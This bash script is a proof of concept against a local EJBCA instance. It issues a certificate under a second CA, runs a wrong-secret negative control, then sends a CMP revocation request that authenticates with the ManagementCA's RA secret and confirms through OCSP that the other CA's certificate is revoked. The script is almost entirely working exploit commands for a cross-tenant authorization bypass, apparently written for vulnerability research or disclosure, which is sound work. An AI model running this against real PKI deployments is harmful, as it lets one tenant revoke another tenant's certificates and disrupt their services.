#!/usr/bin/env bash
# E-01 — Cross-CA CMP revocation. A CMP RA holding ONLY ManagementCA's per-CA secret (secretA)
# revokes a certificate issued by a DIFFERENT CA (CA-B), whose secret (secretB) it never holds.
# Oracle: OCSP (real-time). Includes a negative control (wrong secret must fail auth).
set -u
C="${EJBCA_CONTAINER:-ejbca}"; WORK="${WORK:-/tmp/ejbca-poc}"; cd "$WORK" || exit 1
J() { docker exec "$C" /opt/keyfactor/bin/ejbca.sh "$@" 2>&1 | grep -viE "cannot find name for user ID"; }
URL="http://127.0.0.1:8080/ejbca/publicweb/cmp/ratest"
MCA="$(cat "$WORK/mca_dn.txt")"
ocsp() { openssl ocsp -issuer cab.pem -cert "$1" -url "http://127.0.0.1:8080/ejbca/publicweb/status/ocsp" -no_nonce 2>/dev/null | grep -oiE "$1: (good|revoked|unknown)"; }

echo "### issue a fresh CA-B (Tenant B) certificate: victimB3 ###"
J ra delendentity --username victimB3 --force >/dev/null 2>&1
J ra addendentity --username victimB3 --password foo123 --dn "CN=victimB3,O=Tenant B" --caname CA-B --type 1 --token P12 | grep -i added | head -1
J ra setclearpwd victimB3 foo123 >/dev/null 2>&1; J batch victimB3 >/dev/null 2>&1
docker cp "$C:/opt/keyfactor/p12/victimB3.p12" "$WORK/victimB3.p12" >/dev/null 2>&1
openssl pkcs12 -in victimB3.p12 -clcerts -nokeys -passin pass:foo123 -out victimB3.pem 2>/dev/null
echo "  victimB3 issuer: $(openssl x509 -in victimB3.pem -noout -issuer | sed 's/issuer=//')"
echo "  [0] OCSP before:              $(ocsp victimB3.pem)"

echo "### NEGATIVE CONTROL: recipient=ManagementCA + WRONG secret -> auth must FAIL (no revoke) ###"
openssl cmp -cmd rr -server "$URL" -recipient "$MCA" -ref rauser -secret pass:WRONGPW \
  -oldcert victimB3.pem -unprotected_errors -verbosity 2 2>&1 | grep -oiE "StatusString: \"[^\"]*\"|Failed to verify" | head -1
echo "  [1] OCSP after wrong-secret:  $(ocsp victimB3.pem)   (must still be good)"

echo "### ATTACK: recipient=ManagementCA + secretA (CA-A's RA secret) targeting a CA-B cert ###"
openssl cmp -cmd rr -server "$URL" -recipient "$MCA" -ref rauser -secret pass:secretA \
  -oldcert victimB3.pem -unprotected_errors -verbosity 2 2>&1 | grep -oiE "PKIStatus: [a-z]*|StatusString: \"[^\"]*\"" | head -2
sleep 1
echo "  [2] OCSP after attack:        $(ocsp victimB3.pem)   (REVOKED => cross-CA revocation confirmed)"
